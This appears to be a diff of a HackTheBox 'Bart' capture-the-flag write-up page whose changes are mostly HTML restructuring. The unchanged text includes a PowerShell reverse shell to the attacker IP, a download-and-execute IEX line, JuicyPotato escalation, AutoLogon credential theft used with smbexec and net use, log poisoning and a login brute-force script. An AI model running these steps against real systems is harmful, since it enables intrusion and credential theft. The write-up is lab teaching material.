 <p>Great, it is working. Let&rsquo;s check wappalyzer and see what it reports:</p>
@@ -743,12 +980,58 @@ nmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81
 <p>There happened to be only one entry which was also commented out. It could be a fluke, let&rsquo;s verify that by browsing to the admin panel - &ldquo;wp-admin&rdquo;.</p>
 <p><img src="/HackTheBox/htb-bart/4_fake_wp2.png" alt="Internal Server Error"></p>
 <p>The admin panel was also not accessible, if we would have ran an automated scan without checking things manually first we could have been left puzzled as to why the scan was erroring out.</p>
-<h3 id="general-enumeration-contd">General Enumeration Contd.</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="general-enumeration-contd">
+
+
+<h3 class="header-anchor-wrapper">General Enumeration Contd.
+  <a href="#general-enumeration-contd" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Before we go any further, we must ensure that this is not entirely a rabbit hole, and to do so we will check the results of the all ports scan that we had executed earlier and see if there are any other ports that could possibly give us any more information.</p>
 <p><img src="/HackTheBox/htb-bart/1_nmap3.png" alt="Nmap All Ports Scan"></p>
 <p>Looks like HTTP is the only service that we need to work with. If one was cautious they would run a UDP scan at this point.</p>
 <p>Let&rsquo;s move on to the web enumeration.</p>
-<h3 id="web-enumeration-contd-1">Web Enumeration Contd.</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="web-enumeration-contd-1">
+
+
+<h3 class="header-anchor-wrapper">Web Enumeration Contd.
+  <a href="#web-enumeration-contd-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Since we could not find WordPress related content on the index page, there are two possiblities:</p>
 <ol>
 <li>WordPress content lies somewhere else, and is hidden,</li>
@@ -788,38 +1071,38 @@ It is not necessary that all &ldquo;200 OK&rdquo; responses would have resulted 
 <p><img src="/HackTheBox/htb-bart/6_mon4.png" alt="User Enumeration Found"></p>
 <p>Looks like through the forgot password functionality we can perform user enumeration. Let&rsquo;s use the list of names and email ID pattern to create a set of usernames. Some of the possibilities of the username pattern could be:</p>
 <table class="mc-table">
-<thead>
-<tr>
-<th>Pattern</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>first-name</td>
-<td>robert</td>
-</tr>
-<tr>
-<td>first-namelast-name</td>
-<td>roberthilton</td>
-</tr>
-<tr>
-<td>first-name.last-name</td>
-<td>robert.hilton</td>
-</tr>
-<tr>
-<td>first-name-initial.last-name</td>
-<td>r.hilton</td>
-</tr>
-<tr>
-<td>first-name_last-name</td>
-<td>robert_hilton</td>
-</tr>
-<tr>
-<td>first-name-initial_last-name</td>
-<td>r_hilton</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Pattern</th>
+          <th>Example</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>first-name</td>
+          <td>robert</td>
+      </tr>
+      <tr>
+          <td>first-namelast-name</td>
+          <td>roberthilton</td>
+      </tr>
+      <tr>
+          <td>first-name.last-name</td>
+          <td>robert.hilton</td>
+      </tr>
+      <tr>
+          <td>first-name-initial.last-name</td>
+          <td>r.hilton</td>
+      </tr>
+      <tr>
+          <td>first-name_last-name</td>
+          <td>robert_hilton</td>
+      </tr>
+      <tr>
+          <td>first-name-initial_last-name</td>
+          <td>r_hilton</td>
+      </tr>
+  </tbody>
 </table>
 <p>These may not be the most exhaustive list of possiblities but are very good ones which are often seen around. We will create usernames as per the above patterns for each user we found and test each combination to ensure our test is complete and thorough.</p>
 <p>First testing with Samantha Brown (CEO), for each test case, and we find nothing.
@@ -851,7 +1134,30 @@ Since this test case brought a positive result, we will continue testing with ju
 <p>One thing that bothered me is that as soon as we browsed to the sub-domain we were redirected to this &ldquo;simple chat&rdquo; application. We will have gobuster running in the background, we will first ensure that it is not being hindered by some kinda wildcard stuff like before, and then poke at this application manually.</p>
 <pre  class="mc-prism hide language-text" ><code>gobuster dir -u http://internal-01.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o go_med_internal
 </code></pre>
-<h2 id="initial-access">Initial Access</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="initial-access">
+
+
+<h2 class="header-anchor-wrapper">Initial Access
+  <a href="#initial-access" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Now that the script is doing its&rsquo; job, let&rsquo;s check the source of the login page:</p>
 <p><img src="/HackTheBox/htb-bart/12_internal2.png" alt="Internal Chat Source"></p>
 <p>Let&rsquo;s check out the CSS file.</p>
@@ -931,8 +1237,54 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 <p><img src="/HackTheBox/htb-bart/18_shell3.png" alt="Fetching The Shell"></p>
 <p>Checking the listener, and sure enough, we got our low privileged shell. If you noticed, I used <code>rlwrap</code> to catch my shell here. Rlwrap provides a good amount of functionality - move cursor, maintain command history, clear terminal screen. When working with Windows shells it is hard to get a shell as functional as Linux where you can use Python to make it a fully interactive shell, unlike here.</p>
 <p>You can learn more about rlwrap <a href="https://linux.die.net/man/1/rlwrap">here</a>.</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="local-enumeration-script">Local Enumeration Script</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="privilege-escalation">
+
+
+<h2 class="header-anchor-wrapper">Privilege Escalation
+  <a href="#privilege-escalation" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="local-enumeration-script">
+
+
+<h3 class="header-anchor-wrapper">Local Enumeration Script
+  <a href="#local-enumeration-script" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s transfer a local enumeration script, winPEAS, on here and run it to see if we can find anything.</p>
 <p><img src="/HackTheBox/htb-bart/19_enum1.png" alt="winPEAS Transferred"></p>
 <p>We have successfully transferred the file, let&rsquo;s execute it. The script finishes and prints out all its&rsquo; findings fairly quickly.</p>
@@ -940,7 +1292,30 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 <p>It found the excessive token privileges.</p>
 <p><img src="/HackTheBox/htb-bart/19_enum3.png" alt="Administrator AutoLogon Credentials"></p>
 <p>It also found some credentials and that too of Administrator. Let&rsquo;s exploit both.</p>
-<h3 id="privesc-1---abusing-token-privileges---juicypotato-">PrivEsc 1 - Abusing Token Privileges - JuicyPotato 🥔</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="privesc-1---abusing-token-privileges---juicypotato-">
+
+
+<h3 class="header-anchor-wrapper">PrivEsc 1 - Abusing Token Privileges - JuicyPotato 🥔
+  <a href="#privesc-1---abusing-token-privileges---juicypotato-" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>As soon as I get a shell the first thing that I do is check the privileges I have as the user:</p>
 <p><img src="/HackTheBox/htb-bart/19_enum0.png" alt="Checking Privileges"></p>
 <p>We have the <em>SeImpersonatePrivilege</em> Enabled, which we could use to escalate our privileges to SYSTEM using JuicyPotato exploit. If you don&rsquo;t know what the exploit is, you can read a gist about it <a href="https://github.com/ohpe/juicy-potato#juicy-potato-abusing-the-golden-privileges">here</a></p>
@@ -963,7 +1338,30 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 <p>And we have successfully executed the exploit. Let&rsquo;s go take a look at our listener and see whether we fetched a SYSTEM shell or not:</p>
 <p><img src="/HackTheBox/htb-bart/20_privesc8.png" alt="SYSTEM Shell Fetched"></p>
 <p>And we are SYSTEM! Amazing. We could now go fetch our flags but before that let&rsquo;s take a look at our AutoLogon credentials and see what we can do with that.</p>
-<h3 id="privesc-2---abusing-autologon-credentials">PrivEsc 2 - Abusing AutoLogon Credentials</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="privesc-2---abusing-autologon-credentials">
+
+
+<h3 class="header-anchor-wrapper">PrivEsc 2 - Abusing AutoLogon Credentials
+  <a href="#privesc-2---abusing-autologon-credentials" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>We have Administrators&rsquo; credentials in the AutoLogon registry. It is important to note that although this password looks like a hash, it is not. AutoLogon credentials are never hashed, they&rsquo;re in plaintext.</p>
 <p>We could have found these credentials manually by executing the following command:</p>
 <pre  class="mc-prism hide language-text" ><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;
@@ -981,7 +1379,30 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 <p>A lot of data is missed in the 32-bit one, including the one we care about the most - password. Since we can now fetch the password, let&rsquo;s only print out what is necessary:</p>
 <p><img src="/HackTheBox/htb-bart/process_bad5.png" alt="64-Bit Registry Filtered Query"></p>
 <p>Nice, we now know how to get this value manually, so let&rsquo;s exploit it.</p>
-<h4 id="method-1---smbexecpy">Method 1 - SMBExec.py</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="method-1---smbexecpy">
+
+
+<h4 class="header-anchor-wrapper">Method 1 - SMBExec.py
+  <a href="#method-1---smbexecpy" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Since we know the administrators&rsquo; password, we can log in as administrator using <code>smbexec.py</code>. Smbexec.py, winexe, PSExec, they all use port 445 to operate on. We will run the following command:</p>
 <pre  class="mc-prism hide language-text" ><code>smbexec.py BART/Administrator:3130438f31186fbaf962f407711faddb@10.10.10.81
 </code></pre>
@@ -991,7 +1412,30 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 <p>These are the <a href="https://noobsec.net/privesc-windows/#Port-Forwarding" target="_blank">commands sent</a></p>
 <p><img src="/HackTheBox/htb-bart/22_pe1.png" alt="Port Forwarded"></p>
 <p><img src="/HackTheBox/htb-bart/22_pe2.png" alt="Connection Established"></p>
-<h4 id="method-2---run-as">Method 2 - Run-as</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="method-2---run-as">
+
+
+<h4 class="header-anchor-wrapper">Method 2 - Run-as
+  <a href="#method-2---run-as" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>We could also leverage the password in making a credentialed process. The usual runas command did not work for some odd reason but the one by <a href="https://0xdf.gitlab.io/2018/07/15/htb-bart.html#use-the-source--logging-in">0xdf</a> worked like a charm.</p>
 <p>Ensure you have your shell script hosted and listener running in the back.</p>
 <p>The commands have also been added to the Windows privesc cheatsheet. The commands sent are:</p>
@@ -1006,7 +1450,30 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 <p>The commands have been executed, and the process has stuck which is a good sign. We move to our listener tab and check:</p>
 <p><img src="/HackTheBox/htb-bart/23_runas2.png" alt="Got Admin Shell"></p>
 <p>And we have got an adminitrator shell. Great.</p>
-<h4 id="method-3---net-use">Method 3 - Net use</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="method-3---net-use">
+
+
+<h4 class="header-anchor-wrapper">Method 3 - Net use
+  <a href="#method-3---net-use" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>While checking 0xdfs&rsquo; write-up for the runas command turns out there was another way of getting access to the administrator owned files using <code>net use</code>. Although our objective here is to get admin or SYSTEM shell, we cannot ignore how crucial it could be in an engagement to be able to get hold of admin owned files.</p>
 <p>Command sent:</p>
 <pre  class="mc-prism hide language-text" ><code class="language-cmd">net use x: \\localhost\c$ /user:Administrator 3130438f31186fbaf962f407711faddb
@@ -1016,7 +1483,30 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 <p>The copy has been created successfully, let&rsquo;s see if we can access it.</p>
 <p><img src="/HackTheBox/htb-bart/24_netuse2.png" alt="Accessing Admin Files"></p>
 <p>And sure enough, we were able to access admins&rsquo; files while having a service account.</p>
-<h2 id="flags">Flags</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="flags">
+
+
+<h2 class="header-anchor-wrapper">Flags
+  <a href="#flags" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Now that we have rooted it in different ways, it is time we go get our loot:</p>
 <p><img src="/HackTheBox/htb-bart/21_root.png" alt="Root.txt"></p>
 <p><img src="/HackTheBox/htb-bart/21_user1.png" alt="Finding User.txt"></p>
@@ -1026,7 +1516,30 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 </code></pre>
 <p><img src="/HackTheBox/htb-bart/21_user2.png" alt="Recursive Search"></p>
 <p><img src="/HackTheBox/htb-bart/21_user3.png" alt="User.txt"></p>
-<h2 id="post-exploitation">Post Exploitation</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="post-exploitation">
+
+
+<h2 class="header-anchor-wrapper">Post Exploitation
+  <a href="#post-exploitation" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>We could stop after getting the flags but where&rsquo;s the fun in that. We know there were two login panels so there must be at least two tables from which we could extract credentials from.</p>
 <p>Since we started our shell from simple chat application, let&rsquo;s take a look at the database credentials:</p>
 <p><img src="/HackTheBox/htb-bart/postexp1.png" alt="Simple Chat DB Creds"></p>
@@ -1047,8 +1560,54 @@ Now that we have gotten all the data from this database, let&rsquo;s take a look
 <p>Looks like we selected the right table to dump creds from, we could add these hashes to our cracking list as well. Since there was a forum database too, although there was no place in that sub-domain to login, let&rsquo;s take a look at it:</p>
 <p><img src="/HackTheBox/htb-bart/postexp8.png" alt="Forum DB"></p>
 <p>There happens to be a sole user in this table - bobby. We could add this one to our cracking list as well.</p>
-<h2 id="beyond-root">Beyond Root</h2>
-<h3 id="log-poisoning-analysis">Log Poisoning Analysis</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="beyond-root">
+
+
+<h2 class="header-anchor-wrapper">Beyond Root
+  <a href="#beyond-root" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="log-poisoning-analysis">
+
+
+<h3 class="header-anchor-wrapper">Log Poisoning Analysis
+  <a href="#log-poisoning-analysis" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>FOllowing are the contents of the <em>log.php</em> file:</p>
 <pre  class="mc-prism hide language-text" ><code class="language-php">&lt;?php                                                                                                                                                                                                                                      
 ini_set(&quot;display_errors&quot;, 1);
@@ -1115,7 +1674,30 @@ if(!in_array($username, $users))
 <li>Trusting user input and passing it directly to the PHP variables to user. This allowed us to pass whatever we wanted in the User-Agent header.</li>
 <li>Removing file exist check also allowed to create files on the server.</li>
 </ul>
-<h3 id="brute-forcing-script">Brute Forcing Script</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="brute-forcing-script">
+
+
+<h3 class="header-anchor-wrapper">Brute Forcing Script
+  <a href="#brute-forcing-script" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>My script was shabby and not so aesthetically pleasing, so I took some parts of mine (CSRF token regex, setting cookies, session generation, not expanding wordlist) and stuck it in 0xdfs&rsquo; script. You can check out his script <a href="https://0xdf.gitlab.io/2018/07/15/htb-bart.html#brute-forcer-source">here</a></p>
 <p>You can download my script from my <a href="https://github.com/krnb/scripts/tree/master/HTB/bart">scripts repo</a></p>
 <pre  class="mc-prism hide language-text" ><code class="language-python">#!/usr/bin/env python3
@@ -1195,7 +1777,30 @@ if __name__ == '__main__':
 <p>For the demo I have used a super small wordlist, the script will show the number of request to be made, the arrow goes further towards the completion per request, and once found it will break out and print out the password on the terminal, like below:</p>
 <p><img src="/HackTheBox/htb-bart/brute.png" alt="Password Found"></p>
 <p>If you have trouble understanding which interal function does what, Python documentation is a fantastic resource to check out.</p>
-<h2 id="lessons-learned">Lessons Learned</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="lessons-learned">
+
+
+<h2 class="header-anchor-wrapper">Lessons Learned
+  <a href="#lessons-learned" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <ol>
 <li>Do not leave functionalities lying on the server if it is not required, they can be abused</li>
 <li>Ensure there is a rate limiting feature to your login portals.</li>
@@ -1203,10 +1808,34 @@ if __name__ == '__main__':
 <li>Ensure necessary checks are put when dealing with user input, it should never be trusted.</li>
 <li>Differences in a 32-bit and 64-bit shells</li>
 </ol>
-<h2 id="fin">Fin</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="fin">
+
+
+<h2 class="header-anchor-wrapper">Fin
+  <a href="#fin" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>If you did not understand something, have some suggestion, or found some error, feel free to contact me :)
 Take care and keep hacking, folks!</p>
-
+</section>
+    
 </article>
 </div>
 
@@ -1236,11 +1865,13 @@ Take care and keep hacking, folks!</p>
 </div>
 
                 
+
+                
             </div>
+        </main>
 <footer>
     <article>Made with love...and copious amounts of coffee</article>
 </footer>
 
-</main>
-    </body>
+</body>
 </html>
